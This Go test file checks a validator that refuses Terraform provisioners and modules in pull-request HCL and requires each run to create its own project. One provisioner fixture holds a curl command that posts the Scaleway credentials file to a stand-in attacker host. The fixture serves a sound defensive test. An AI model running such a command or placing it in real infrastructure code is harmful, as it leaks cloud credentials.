package cli

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func writeGateHCL(t *testing.T, body string) string {
	t.Helper()
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "main.tf"), []byte(body), 0o600); err != nil {
		t.Fatalf("write hcl: %v", err)
	}
	return dir
}

const gateProject = `resource "scaleway_account_project" "main" { name = "x" }` + "\n"

// A provisioner runs arbitrary commands during apply, in a process that
// holds live cloud credentials in its environment. The resource-type
// allowlist cannot see it, and the S144 gate applies HCL that arrives from
// a pull request.
func TestLayer3RefusesProvisioner(t *testing.T) {
	dir := writeGateHCL(t, gateProject+`
resource "scaleway_block_volume" "v" {
  size_in_gb = 1
  provisioner "local-exec" {
    command = "curl -d @$HOME/.config/scw/config.yaml https://attacker.example"
  }
}`)

	err := validateLayer3NoEscapeHatches(dir)
	if err == nil {
		t.Fatal("a provisioner must be refused before any real apply")
	}
	if !strings.Contains(err.Error(), "provisioner") {
		t.Errorf("error did not name the construct: %v", err)
	}
}

// A module declares resources the type scan never sees, so any type at all
// could reach the real API through one.
func TestLayer3RefusesModule(t *testing.T) {
	dir := writeGateHCL(t, gateProject+`
module "anything" {
  source = "./expensive"
}`)

	err := validateLayer3NoEscapeHatches(dir)
	if err == nil {
		t.Fatal("a module must be refused before any real apply")
	}
	if !strings.Contains(err.Error(), "module") {
		t.Errorf("error did not name the construct: %v", err)
	}
}

// The check must not fire on the HCL Layer 3 actually uses, or it would
// block every legitimate run.
func TestLayer3AcceptsOrdinaryFlatHCL(t *testing.T) {
	dir := writeGateHCL(t, gateProject+`
resource "scaleway_block_volume" "data" {
  name       = "d"
  size_in_gb = 5
  project_id = scaleway_account_project.main.id
}`)

	if err := validateLayer3NoEscapeHatches(dir); err != nil {
		t.Errorf("ordinary Layer 3 HCL was refused: %v", err)
	}
}

// ADR-0010 requires each run to create and destroy its own project; that is
// what bounds blast radius. A fixture of only-allowlisted types with no
// project would land in fallback_project_id instead.
func TestLayer3RequiresItsOwnProject(t *testing.T) {
	dir := writeGateHCL(t, `resource "scaleway_block_volume" "orphan" { size_in_gb = 1 }`)

	if err := validateLayer3ProjectResource(dir); err == nil {
		t.Fatal("HCL without a scaleway_account_project must be refused")
	}
}
